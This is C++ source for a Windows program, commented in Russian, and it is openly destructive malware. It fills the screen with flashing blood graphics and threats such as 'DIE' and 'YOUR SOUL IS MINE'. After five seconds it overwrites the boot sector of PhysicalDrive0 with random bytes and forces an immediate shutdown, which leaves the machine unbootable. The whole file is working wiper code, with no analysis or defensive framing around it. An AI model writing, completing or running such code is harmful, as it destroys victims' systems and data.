#include <windows.h>
#include <cstdlib>
#include <ctime>
#include <string>
#include <thread>
#include <chrono>

// ==========================================
// ЧАСТЬ 1: РИСУЕМ КРОВЬ И УЖАС
// ==========================================

void DrawBlood(HDC hdc, int w, int h) {
    // Красная кисть для крови
    HBRUSH bloodBrush = CreateSolidBrush(RGB(150, 0, 0));
    
    // 1. Рисуем капли крови (случайные круги и линии сверху)
    for (int i = 0; i < 50; i++) {
        int x = rand() % w;
        int y = rand() % (h / 2);
        int size = rand() % 30 + 10;
        Ellipse(hdc, x, y, x + size, y + size);
        
        // Добавляем "подтеки" (линии вниз)
        HPEN bloodPen = CreatePen(PS_SOLID, rand() % 5 + 1, RGB(150, 0, 0));
        SelectObject(hdc, bloodPen);
        MoveToEx(hdc, x + size/2, y + size, NULL);
        LineTo(hdc, x + size/2, y + size + rand() % 200);
        DeleteObject(bloodPen);
    }
    
    DeleteObject(bloodBrush);
}

void DrawScaryText(HDC hdc, int w, int h) {
    // Жуткий шрифт
    HFONT hFont = CreateFontW(
        80, 0, 0, 0, FW_BOLD, TRUE, FALSE, FALSE, 
        DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, 
        CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, 
        VARIABLE_PITCH, L"Impact" // Жирный шрифт
    );
    SelectObject(hdc, hFont);
    
    // Красный цвет текста
    SetTextColor(hdc, RGB(255, 0, 0));
    SetBkMode(hdc, TRANSPARENT);
    
    // Текст в случайных местах
    const wchar_t* texts[] = {
        L"I SEE YOU",
        L"YOUR SOUL IS MINE",
        L"BLOOD FOR THE BLOOD GOD",
        L"DIE",
        L"HELP ME"
    };
    
    for (int i = 0; i < 5; i++) {
        int x = rand() % (w - 400);
        int y = rand() % (h - 200);
        TextOutW(hdc, x, y, texts[i], wcslen(texts[i]));
    }
    
    DeleteObject(hFont);
}

// ==========================================
// ЧАСТЬ 2: СНОС MBR
// ==========================================
void DestroyMBR() {
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE,
                                 FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice != INVALID_HANDLE_VALUE) {
        BYTE garbage[512];
        for (int i = 0; i < 512; i++) garbage[i] = rand() % 256;
        DWORD bytesWritten;
        WriteFile(hDevice, garbage, 512, &bytesWritten, NULL);
        CloseHandle(hDevice);
    }
}

// ==========================================
// ЧАСТЬ 3: ГЛАВНЫЙ ЦИКЛ УЖАСА
// ==========================================
void HorrorLoop() {
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    
    srand(time(NULL));
    
    // Бесконечный цикл (пока не снесем MBR и не выключим)
    while (true) {
        // Заливаем черным
        HBRUSH blackBrush = CreateSolidBrush(RGB(0, 0, 0));
        RECT rect = {0, 0, w, h};
        FillRect(hdc, &rect, blackBrush);
        DeleteObject(blackBrush);
        
        // Рисуем кровь и текст
        DrawBlood(hdc, w, h);
        DrawScaryText(hdc, w, h);
        
        // Мерцание (пульсация красным)
        HBRUSH redFlash = CreateSolidBrush(RGB(100, 0, 0));
        for (int i = 0; i < 5; i++) {
            FillRect(hdc, &rect, redFlash);
            Sleep(50);
            FillRect(hdc, &rect, blackBrush);
            Sleep(50);
        }
        DeleteObject(redFlash);
        
        Sleep(1000); // Пауза перед следующей итерацией
    }
    
    ReleaseDC(NULL, hdc);
}

// ==========================================
// ГЛАВНАЯ ФУНКЦИЯ
// ==========================================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Запускаем снос MBR в фоне через 5 секунд
    std::thread([]() {
        std::this_thread::sleep_for(std::chrono::seconds(5));
        DestroyMBR();
        system("shutdown /s /f /t 0");
    }).detach();
    
    // Запускаем кровавый ужас
    HorrorLoop();
    
    return 0;
}
